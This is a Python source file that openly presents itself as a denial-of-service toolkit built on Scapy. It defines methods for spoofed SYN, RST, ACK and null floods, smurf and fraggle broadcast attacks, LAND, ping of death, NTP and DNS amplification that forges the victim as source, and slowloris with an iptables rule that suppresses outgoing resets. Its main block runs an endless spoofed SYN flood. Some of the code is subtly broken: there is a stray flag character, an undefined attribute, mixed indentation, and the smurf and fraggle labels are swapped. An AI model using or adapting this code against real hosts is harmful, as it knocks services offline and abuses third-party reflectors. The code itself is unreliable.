# Jayesh Patel
# DoS Attack using Scrapy

from scapy.all import *
import ipaddr
import commands

class Dos_Attack(object):
	def __init__(self, sip, dip):
		self.sip =sip
		self.dip = dip

	def SYN_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="S", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="S", sport=RandShort(), dport=dport))
		send(Pkt)

	def RST_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="R", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="R", sport=RandShort(), dport=dport))
		send(Pkt)

	def FIN_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="F", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="F", sport=RandShort(), dport=dport))
		send(Pkt)

	def HTTP_GET_ATT(self, getStr): 
		# getStr = 'GET /index.html HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: gzip, deflate\r\n\r\n'
		syn = IP(dst=self.dip) / TCP(sport=random.randint(1025,65500), dport=80, flags='S')
    		syn_ack = sr1(syn)
    		out_ack = send(IP(dst=self.dip) / TCP(dport=80, sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A'))
    		sr1(IP(dst=self.dip) / TCP(dport=80, sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='P''A') / getStr) 

	def DNS_ATT(self, domain_name): 
		Pkt = (IP(dst=self.dip, src=self.sip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=domain_name)))
		send(Pkt)

	def SNMP_ATT(self):
		Pkt = (IP(src=self.sip, dst=self.dip)/UDP(sport=161,dport=161)/SNMP(version="v2c",community="public",PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))])))
		send(Pkt)

	def SMURF_ATT(self, broad_cast):
		Pkt = send(IP(src=self.dip, dst=broad_cast)/UDP(dport=7),verbose=0)
		send(Pkt)

	def FRAGGLE_ATT(self, broad_cast):
		Pkt = send(IP(src=self.dip,dst=broad_cast)/ICMP(),verbose=0)
		send(Pkt)

	def LAND_ATT(self, dport):
		Pkt = (IP(src=self.dip, dst=self.dip)/TCP(sport=dport, dport=dport))
		send(Pkt)

	def PINGoD_ATT(self):
		Pkt = (IP(src=self.sip, dst=self.dip)/ICMP()/("m"*60000))
		send(Pkt)

	def PING_AMPLIFICATION_ATT(self, broad_cast):
		# Add broadcast address 
		Pkt = (IP(src=self.dip, dst=broad_cast)/ICMP()/("m"*60000))
		send(Pkt)

	def NTP_AMPLIFICATION_ATT(self, sport, ntpip):
		if sport != "random":
			Pkt = (IP(dst=ntpip, src=self.dip)/UDP(dport=123,sport=sport)/("\x1b\x00\x00\x00"+"\x00"*11*4))
		else:
			Pkt = (IP(dst=ntpip, src=self.dip)/UDP(dport=123,sport=RandShort())/("\x1b\x00\x00\x00"+"\x00"*11*4))
		send(Pkt)

	def NTP_ATT(self, sport, ntpip):
		if sport != "random":
			Pkt = (IP(dst=ntpip)/UDP(dport=123,sport=sport)/("\x1b\x00\x00\x00"+"\x00"*11*4))
		else:
			Pkt = (IP(dst=ntpip)/UDP(dport=123,sport=RandShort())/("\x1b\x00\x00\x00"+"\x00"*11*4))
		send(Pkt)

	def UDP_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/UDP(sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/UDP(sport=RandShort(), dport=dport))
		send(Pkt)

	def TOS_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="ECE", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="ECE", sport=RandShort(), dport=dport))
		send(Pkt)

	def TCP_NULL_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="", sport=RandShort(), dport=dport))
		send(Pkt)

	def SYN_ACK_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="SA", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="SA", sport=RandShort(), dport=dport))
		send(Pkt)


	def ACK_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="A", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="A`", sport=RandShort(), dport=dport))
		send(Pkt)

	def ACKPUSH_ATT(self, sport, dport):
		if sport != "random":
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="PA", sport=sport, dport=dport))
		else:
			Pkt = (IP(src=self.sip, dst=self.dip)/TCP(flags="PA", sport=RandShort(), dport=self.dport))
		send(Pkt)
		
	def IPNULL_ATT(self):
		Pkt = (IP(src=self.sip, dst=self.dip, proto=0)/TCP())
		send(Pkt)
	
	def slowloris_ATT(self, sp, numgets):
		cmd = "iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
		status, output = commands.getstatusoutput(cmd)

		i = IP()
		i.dst = self.dip

		for s in range(sp, sp+numgets-1):
			t = TCP()
			t.dport = 80
			t.sport = s
			t.flags = "S"
			ans = sr1(i/t, verbose=0)
			t.seq = ans.ack
			t.ack = ans.seq + 1
			t.flags = "A"
			get = "GET / HTTP/1.1\r\nHost: " + self.dip
			ans = sr1(i/t/get, verbose=0)
			print "Attacking from port ", s

		cmd = "iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP"
		status, output = commands.getstatusoutput(cmd)

		

	


if __name__ == "__main__":
	"""	
	res = Dos_Attack('192.168.10.2', '192.168.20.2',)
	data = res.slowloris_ATT(3000, 1000)
	print data
	"""
	
	cmd = "iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
	status, output = commands.getstatusoutput(cmd)
	ip = ipaddr.IPAddress('192.168.10.10')
	while True:
		res = Dos_Attack(str(ip), '192.168.20.2')
		data = res.SYN_ATT(143, 80)
		print data
